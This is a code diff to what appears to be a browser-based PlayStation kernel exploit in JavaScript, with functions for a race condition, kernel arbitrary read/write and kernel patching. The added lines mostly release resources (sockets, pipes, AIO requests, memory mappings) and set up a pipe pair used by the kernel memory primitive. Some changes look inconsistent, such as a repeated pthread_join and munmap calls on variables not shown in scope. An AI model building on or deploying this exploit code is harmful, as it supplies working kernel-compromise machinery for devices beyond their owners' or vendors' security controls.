@@ -597,6 +597,8 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
     if (main_res === -1) {
         call_nze('pthread_join', pthr, 0);
         log();
+         close(tcp_sd);
+         call_nze('pthread_join', pthr, 0);
         return null;
     }
 
@@ -1170,7 +1172,8 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const psd = pktopts_sds[0];
     const tclass = new Word();
     const off_tclass = is_ps4 ? 0xb0 : 0xc0;
-
+    const pipes = new View4(2);
+    sysi('pipe', pipes.addr);
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
     const pktinfo_p = k100_addr.add(0x10);
@@ -1477,7 +1480,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
     
-    return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
+    return [kbase, kmem, p_ucred,pipes, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
 // FUNCTIONS FOR STAGE: PATCH KERNEL
@@ -1606,6 +1609,11 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes";
    //alert("kernel exploit succeeded!");
+
+     sysi('munmap', exec_addr, map_size);
+  sysi('munmap', write_addr, map_size);
+  close(exec_fd);
+  close(write_fd);
 }
 
 
@@ -1693,6 +1701,7 @@ function runBinLoader() {
 //
 // the exploit implementation also assumes that we are pinned to one core
 export async function kexploit() {
+      let pktopts_sds, dirty_sd, pipes;
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
@@ -1764,6 +1773,25 @@ export async function kexploit() {
         
     } finally {
         close(unblock_fd);
+        
+    close(block_fd);
+    free_aios2(groom_ids.addr, groom_ids.length);
+    aio_multi_wait(block_id.addr, 1);
+    aio_multi_delete(block_id.addr, block_id.length);
+
+         if (pktopts_sds) {
+      close(pktopts_sds[0]);
+      close(pktopts_sds[1]);
+    }
+
+        if (dirty_sd) close(dirty_sd);
+    if (pipes) {
+      close(pipes[0]);
+      close(pipes[1]);
+    }
+        for (const sd of sds) {
+      close(sd);
+    }
 
         const t2 = performance.now();
         const ftime = t2 - t1;
